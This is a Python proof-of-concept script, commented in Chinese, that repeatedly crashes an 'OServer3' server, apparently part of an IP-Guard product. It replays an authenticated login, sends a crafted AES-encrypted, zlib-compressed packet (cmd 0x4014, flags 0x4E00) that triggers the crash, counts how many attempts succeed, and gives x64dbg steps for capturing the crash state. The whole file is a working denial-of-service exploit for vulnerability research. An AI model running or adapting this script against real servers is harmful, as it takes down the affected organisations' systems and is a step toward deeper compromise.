"""poc_4E00_minimal.py — OServer3 0x4E00 crash 最小复现 (修复版)

精确 trigger (v5 实测确认):
  cmd     = 0x4014
  sub     = 6
  flags   = 0x4E00            # FLAG_CRYPT(0x4000) | FLAG_COMP(0x0800) | 0x0600
  plain   = b"\\x01\\x00\\x00\\x00"   # DWORD=1, server 解压解密后看到的内容

注意:
  上线 wire body = zlib(plain) → AES-CBC encrypt → ~32B
  server 解密+解压后得到 4B `\\x01...`, 然后按 DWORD=1 选 switch case → 崩

用法:
  python poc_4E00_minimal.py 192.168.2.130 8236 Admin admin123456 [count]

x64dbg 配合:
  1. x64dbg 附加 OServer3_x64.exe
  2. Options → Preferences → Exceptions → 勾 First-chance exceptions
  3. 跑这个 PoC
  4. 崩溃断下时记录: EXC code / RIP / RAX-R15 / RSP+200B / 反汇编 ±10 行
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


def fresh_send(host, port, user, pwd, cmd, sub, body, flags, timeout=15.0):
    """登录 + 发一个 cmd,返回结果或异常字符串."""
    try:
        base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
    except Exception as e:
        return {"_err": f"connect: {e}"}
    try:
        idx, lr, st, _ = replay_login(s, user, pwd, base_nonce,
                                       show_crypto=False, verbose=False)
        next_nonce = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body,
        )
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s))
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": str(e)}
    except Exception as e:
        return {"_err": str(e)}
    finally:
        try: s.close()
        except: pass


def check_alive(host, port, timeout=3.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionError, OSError):
        return False


def fmt(r):
    if "_err" in r:
        return f"_err={r['_err']}"
    return f"flags=0x{r.get('flags',0):04x} plen={r.get('payload_len',0)}"


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]
    count = int(sys.argv[5]) if len(sys.argv) >= 6 else 3

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Trigger: cmd=0x4014/sub=6 flags=0x4E00 plain=\\x01\\x00\\x00\\x00")
    print(f"[*] (build_packet_with_state 会自动 zlib+AES 这 4B 到 ~32B 线上包)\n")

    crash_count = 0
    for i in range(count):
        print(f"=== round {i+1}/{count} ===")
        if not check_alive(host, port):
            print(f"  server down, waiting for guard...")
            for _ in range(20):
                time.sleep(0.5)
                if check_alive(host, port):
                    print(f"  guard restarted")
                    break

        r = fresh_send(host, port, user, pwd,
                       cmd=0x4014, sub=6,
                       body=b"\x01\x00\x00\x00",
                       flags=0x4E00)
        crashed = "_err" in r
        if crashed:
            crash_count += 1
            print(f"  💥 CRASH: {fmt(r)}")
            # 等 guard 重启
            print(f"  waiting for guard...")
            for w in range(20):
                time.sleep(0.5)
                if check_alive(host, port):
                    print(f"  guard up after {w*0.5+0.5:.1f}s")
                    break
            else:
                print(f"  ⚠️ server didn't come back in 10s")
        else:
            print(f"  no crash: {fmt(r)}")
        print()

    print("=" * 60)
    print(f"Total: {crash_count}/{count} crashes confirmed")
    if crash_count == count:
        print("✅ 100% 稳定崩 — 接下来上 x64dbg 抓崩溃状态")
    elif crash_count > 0:
        print("⚠️ 有时崩有时不崩 — 可能 race condition,需多发几次")
    else:
        print("❌ 没崩 — 检查环境/版本")


if __name__ == "__main__":
    main()
